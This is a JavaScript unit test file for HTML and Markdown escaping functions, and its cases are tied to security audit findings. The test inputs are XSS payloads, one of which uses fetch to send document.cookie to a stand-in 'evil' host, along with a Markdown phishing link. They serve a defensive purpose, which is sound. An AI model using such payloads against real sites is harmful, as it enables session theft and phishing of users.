import { test } from 'node:test';
import assert from 'node:assert/strict';
import { escHtml, escapeMd } from '../lib/sanitize.mjs';

// ─── escHtml ────────────────────────────────────────────────────────────────

test('escHtml: blocks script-context breakout payload', () => {
  // Finding #1: </script><img src=x onerror=...> from inject.mjs
  assert.equal(
    escHtml('</script><img src=x onerror=fetch("//evil/"+document.cookie)>'),
    '&lt;/script&gt;&lt;img src=x onerror=fetch(&quot;//evil/&quot;+document.cookie)&gt;'
  );
});

test('escHtml: blocks incomplete-tag DOM XSS bypass (finding #2)', () => {
  // Payload without trailing > bypasses cleanText's old regex
  const result = escHtml('<img src=x onerror=alert(document.domain)//');
  assert.ok(!result.includes('<img'), 'must not contain unencoded <img');
  assert.ok(result.includes('&lt;img'), 'must contain encoded &lt;img');
});

test('escHtml: encodes all five dangerous characters', () => {
  assert.equal(escHtml('& < > " \''), '&amp; &lt; &gt; &quot; &#39;');
});

test('escHtml: decodes one entity layer then re-encodes (no double-encoding)', () => {
  // Input already has &amp; — should display as & not &amp;amp;
  const result = escHtml('AT&amp;T');
  assert.equal(result, 'AT&amp;T');
});

test('escHtml: coerces non-string to string', () => {
  assert.equal(escHtml(42), '42');
  assert.equal(escHtml(null), 'null');
});

test('escHtml: handles empty string', () => {
  assert.equal(escHtml(''), '');
});

// ─── escapeMd ───────────────────────────────────────────────────────────────

test('escapeMd: blocks Markdown link injection (finding #7)', () => {
  // Attacker posts: [Click here](https://evil.example/phish)
  const result = escapeMd('[Security alert: click here](https://evil.example/phish)');
  assert.ok(!result.startsWith('['), 'leading [ must be escaped');
  assert.ok(result.startsWith('\\['), 'leading [ must become \\[');
});

test('escapeMd: escapes _ * ` [', () => {
  assert.equal(escapeMd('_bold_ *italic* `code` [link]'), '\\_bold\\_ \\*italic\\* \\`code\\` \\[link]');
});

test('escapeMd: returns empty string for falsy input', () => {
  assert.equal(escapeMd(''), '');
  assert.equal(escapeMd(null), '');
  assert.equal(escapeMd(undefined), '');
});

test('escapeMd: leaves safe text unchanged', () => {
  assert.equal(escapeMd('VIX: 18.5 | WTI: $72.40'), 'VIX: 18.5 | WTI: $72.40');
});
